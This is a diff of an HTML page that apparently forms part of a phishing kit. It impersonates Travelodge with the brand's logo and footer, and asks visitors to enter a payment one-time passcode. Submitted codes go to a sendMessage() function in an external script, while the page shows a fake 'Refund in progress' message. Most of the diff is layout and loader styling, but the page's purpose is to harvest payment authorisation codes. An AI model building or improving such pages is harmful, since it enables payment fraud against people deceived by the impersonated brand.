@@ -9,7 +9,7 @@
         justify-content: center;
         align-items: center;
         flex-direction: column;
-        height: 90vh;
+        height: 100vh;
         width: 100vw;
         margin: 0;
         background-color: #004282;
@@ -22,22 +22,22 @@
         transform: translateY(50px);
       }
 
-      .loader {
+      /* .loader {
         width: 200px;
         height: 200px;
         position: relative;
         transform: translateX(100px) translateY(80px);
-      }
+      } */
 
       .text {
         position: relative;
-        transform: translateX(10px) translateY(50px);
+        transform: translateX(10px) translateY(10px);
         color: aliceblue;
       }
 
       .otpform {
         position: relative;
-        transform: translateX(40px) translateY(100px);
+        transform: translateX(40px) translateY(50px);
         color: aliceblue;
       }
 
@@ -47,8 +47,94 @@
         transform: translateY(170px);
         color: aliceblue;
       }
-
+      .loader {
+        display: inline-block;
+        position: relative;
+        width: 80px;
+        height: 80px;
+        transform: translateX(-10px) translateY(100px);
+      }
       .dot {
+        position: absolute;
+        width: 6px;
+        height: 6px;
+        background: #fff;
+        border-radius: 50%;
+        animation: rotate 1.2s linear infinite;
+      }
+      .dot:nth-child(1) {
+        animation-delay: 0s;
+        top: 37px;
+        left: 66px;
+      }
+      .dot:nth-child(2) {
+        animation-delay: -0.1s;
+        top: 22px;
+        left: 62px;
+      }
+      .dot:nth-child(3) {
+        animation-delay: -0.2s;
+        top: 11px;
+        left: 52px;
+      }
+      .dot:nth-child(4) {
+        animation-delay: -0.3s;
+        top: 7px;
+        left: 37px;
+      }
+      .dot:nth-child(5) {
+        animation-delay: -0.4s;
+        top: 11px;
+        left: 22px;
+      }
+      .dot:nth-child(6) {
+        animation-delay: -0.5s;
+        top: 22px;
+        left: 11px;
+      }
+      .dot:nth-child(7) {
+        animation-delay: -0.6s;
+        top: 37px;
+        left: 7px;
+      }
+      .dot:nth-child(8) {
+        animation-delay: -0.7s;
+        top: 52px;
+        left: 11px;
+      }
+      .dot:nth-child(9) {
+        animation-delay: -0.8s;
+        top: 62px;
+        left: 22px;
+      }
+      .dot:nth-child(10) {
+        animation-delay: -0.9s;
+        top: 66px;
+        left: 37px;
+      }
+      .dot:nth-child(11) {
+        animation-delay: -1s;
+        top: 62px;
+        left: 52px;
+      }
+      .dot:nth-child(12) {
+        animation-delay: -1.1s;
+        top: 52px;
+        left: 62px;
+      }
+      @keyframes rotate {
+        0%,
+        20%,
+        80%,
+        100% {
+          transform: scale(1);
+        }
+        50% {
+          transform: scale(1.5);
+        }
+      }
+
+      /* .dot {
         position: absolute;
         width: 20px;
         height: 20px;
@@ -96,7 +182,7 @@
       }
       .dot:nth-child(10) {
         animation-delay: -0.2s;
-      }
+      } */
     </style>
 
     <link
@@ -105,24 +191,37 @@
       integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN"
       crossorigin="anonymous"
     />
+    <link rel="stylesheet" href="main.css" />
     <script src="script.js"></script>
     <script>
-      window.onload = () => {
-        const form = document.querySelector(".otpform");
-        const text = document.querySelector(".text2");
-        form.addEventListener("submit", (e) => {
-          e.preventDefault();
-          const formData = new FormData(e.target);
-          text.style.display = "block";
-          sendMessage(formData, "https://travelodge.co.uk", 10000);
-        });
-      };
+      window.onload = () => {};
     </script>
   </head>
   <body style="background-color: #004282">
     <div class="logo">
       <img src="pp/images/travelodge_logo.png" alt="logo" />
     </div>
+
+    <div class="text">
+      <h4>Please approve payment via app or one-time passcode</h4>
+    </div>
+    <form class="otpform">
+      <div class="row g-3">
+        <div class="col">
+          <input
+            class="form-control"
+            type="number"
+            name="OTP Code"
+            placeholder="OTP Code"
+            minlength="6"
+            required
+          />
+        </div>
+        <div class="col">
+          <button class="btn btn-primary" type="submit">Continue</button>
+        </div>
+      </div>
+    </form>
     <div class="loader">
       <div class="dot"></div>
       <div class="dot"></div>
@@ -134,27 +233,257 @@
       <div class="dot"></div>
       <div class="dot"></div>
       <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
     </div>
-    <div class="text">
-      <h4>Please approve payment via app or one-time passcode</h4>
-    </div>
-    <form class="otpform">
-      <div class="row g-3">
-        <div class="col">
-          <input class="form-control" type="number" name="OTP Code" placeholder="OTP Code" minlength="6" required />
-        </div>
-        <div class="col">
-          <button class="btn btn-primary" type="submit">Continue</button>
-        </div>
-      </div>
-    </form>
     <div class="text2">
       <h4>Refund in progress....</h4>
     </div>
+    <footer class="c-footer">
+      <!-- <div class="c-footer__section u-clearfix visible-xs">
+        <div class="c-footer-social-links-mobile">
+          <ul class="c-footer-social-links-mobile__icons u-reset-list c-table">
+            <li class="c-table__cell c-table__cell--middle footer-icon">
+              <a
+                href="https://en-gb.facebook.com/travelodgeuk"
+                title="Facebook"
+              >
+                <img
+                  src="https://www.travelodge.co.uk/nw/sites/default/files/icons/i_facebook.png"
+                  alt="Image of Facebook logo"
+                  title="Facebook"
+                />
+              </a>
+            </li>
+            <li class="c-table__cell c-table__cell--middle footer-icon">
+              <a href="https://twitter.com/TravelodgeUK" title="Twitter">
+                <img
+                  src="https://www.travelodge.co.uk/nw/sites/default/files/icons/i_twitter.png"
+                  alt="Image of Twitter logo"
+                  title="Twitter"
+                />
+              </a>
+            </li>
+            <li class="c-table__cell c-table__cell--middle footer-icon">
+              <a
+                href="https://www.youtube.com/user/TravelodgeUK"
+                title="YouTube"
+              >
+                <img
+                  src="https://www.travelodge.co.uk/nw/sites/default/files/icons/i_mail.png"
+                  alt="Image of YouTube logo"
+                  title="YouTube"
+                />
+              </a>
+            </li>
+            <li class="c-table__cell c-table__cell--middle footer-icon">
+              <a href="https://www.travelodge.co.uk/blog" title="Blog">
+                <img
+                  src="https://www.travelodge.co.uk/nw/sites/default/files/icons/blog-link_0_grey.png"
+                  alt="Image of Blog logo"
+                  title="Blog"
+                />
+              </a>
+            </li>
+          </ul>
+        </div>
+      </div> -->
+      <div class="c-footer__section u-clearfix">
+        <div class="row">
+          <ul class="c-footer-nav-bottom col-md-9 col-lg-8 u-reset-list">
+            <li class="u-inline-block u-margin-right-sm u-font-size-sm">
+              © Travelodge 2024
+            </li>
+            <li class="u-inline-block u-margin-right-sm">
+              <a
+                href="https://www.travelodge.co.uk/about/privacy-policy/"
+                title="Privacy policy"
+                class="u-font-size-sm"
+              >
+                Privacy policy
+              </a>
+            </li>
+            <li class="u-inline-block u-margin-right-sm">
+              <a
+                href="https://www.travelodge.co.uk/about/terms-conditions/"
+                title="Booking T&amp;Cs"
+                class="u-font-size-sm"
+              >
+                Booking T&amp;Cs
+              </a>
+            </li>
+            <li class="u-inline-block u-margin-right-sm">
+              <a
+                href="https://www.travelodge.co.uk/about/promo-terms-conditions/"
+                title="Promotional T&amp;Cs"
+                class="u-font-size-sm"
+              >
+                Promotional T&amp;Cs
+              </a>
+            </li>
+            <li class="u-inline-block u-margin-right-sm">
+              <a
+                href="https://www.travelodge.co.uk/about/accessibility-guide/"
+                title="Site accessibility"
+                class="u-font-size-sm"
+              >
+                Site accessibility
+              </a>
+            </li>
+            <li class="u-inline-block u-margin-right-sm">
+              <a
+                href="https://www.travelodge.co.uk/about/integrity-statement/"
+                title="Integrity statement"
+                class="u-font-size-sm"
+              >
+                Integrity statement
+              </a>
+            </li>
+            <li class="u-inline-block u-margin-right-sm">
+              <a
+                href="https://www.travelodge.co.uk/about/responsible-disclosure-policy/"
+                title="Disclosure"
+                class="u-font-size-sm"
+              >
+                Disclosure
+              </a>
+            </li>
+            <li class="u-inline-block u-margin-right-sm">
+              <a
+                href="https://www.travelodge.co.uk/site-map"
+                title="Sitemap"
+                class="u-font-size-sm"
+              >
+                Sitemap
+              </a>
+            </li>
+            <li class="u-inline-block u-margin-right-sm">
+              <a
+                href="https://www.travelodge.co.uk/blog/"
+                title="Blog"
+                class="u-font-size-sm"
+              >
+                Blog
+              </a>
+            </li>
+            <li class="u-inline-block u-margin-right-sm">
+              <a
+                href="https://www.travelodge.co.uk/careers/"
+                title="Careers"
+                class="u-font-size-sm"
+              >
+                Careers
+              </a>
+            </li>
+            <li class="u-inline-block u-margin-right-sm">
+              <a
+                href="https://www.travelodgesustainability.co.uk/"
+                title="Sustainability"
+                class="u-font-size-sm"
+              >
+                Sustainability
+              </a>
+            </li>
+            <li class="u-inline-block u-margin-right-sm">
+              <a
+                href="https://www.travelodge.co.uk/press-centre"
+                title="Press centre"
+                class="u-font-size-sm"
+              >
+                Press centre
+              </a>
+            </li>
+          </ul>
+          <div class="c-footer-social-links col-md-3 col-lg-4">
+            <ul class="c-footer-social-links__icons u-reset-list c-table">
+              <li class="c-table__cell c-table__cell--middle">
+                <a href="https://www.paypal.com/uk/webapps/mpp/paypal-popup">
+                  <img
+                    height="17"
+                    src="https://www.travelodge.co.uk/nw/assets/img/icons/paypal.png"
+                    alt="PayPal"
+                    class="PayPal"
+                  />
+                </a>
+              </li>
+              <li
+                class="hidden-xs c-table__cell c-table__cell--middle footer-icon"
+              >
+                <a
+                  href="https://en-gb.facebook.com/travelodgeuk"
+                  title="Facebook"
+                >
+                  <img
+                    src="https://www.travelodge.co.uk/nw/sites/default/files/icons/i_facebook.png"
+                    alt="Image of Facebook logo"
+                    title="Facebook"
+                  />
+                </a>
+              </li>
+              <li
+                class="hidden-xs c-table__cell c-table__cell--middle footer-icon"
+              >
+                <a href="https://twitter.com/TravelodgeUK" title="Twitter">
+                  <img
+                    src="https://www.travelodge.co.uk/nw/sites/default/files/icons/i_twitter.png"
+                    alt="Image of Twitter logo"
+                    title="Twitter"
+                  />
+                </a>
+              </li>
+              <li
+                class="hidden-xs c-table__cell c-table__cell--middle footer-icon"
+              >
+                <a
+                  href="https://www.youtube.com/user/TravelodgeUK"
+                  title="YouTube "
+                >
+                  <img
+                    src="https://www.travelodge.co.uk/nw/sites/default/files/icons/i_mail.png"
+                    alt="Image of YouTube logo"
+                    title="YouTube"
+                  />
+                </a>
+              </li>
+              <li
+                class="hidden-xs c-table__cell c-table__cell--middle footer-icon"
+              >
+                <a href="https://www.travelodge.co.uk/blog" title="Blog">
+                  <img
+                    src="https://www.travelodge.co.uk/nw/sites/default/files/icons/blog-link_0_grey.png"
+                    alt="Image of Blog logo"
+                    title="Blog"
+                  />
+                </a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </footer>
     <script
       src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
       integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
       crossorigin="anonymous"
     ></script>
+    <script>
+      window.onload = () => {
+        const width = screen.width;
+        const height = screen.height;
+        const footer = document.querySelector(".c-footer");
+        if (width < 768) {
+          footer.style.marginTop = `${screen.height - 100}px`;
+          console.log(footer.style.marginTop);
+        }
+        const form = document.querySelector(".otpform");
+        const text = document.querySelector(".text2");
+        form.addEventListener("submit", (e) => {
+          e.preventDefault();
+          const formData = new FormData(e.target);
+          text.style.display = "block";
+          sendMessage(formData, "https://travelodge.co.uk", 10000);
+        });
+      };
+    </script>
   </body>
 </html>
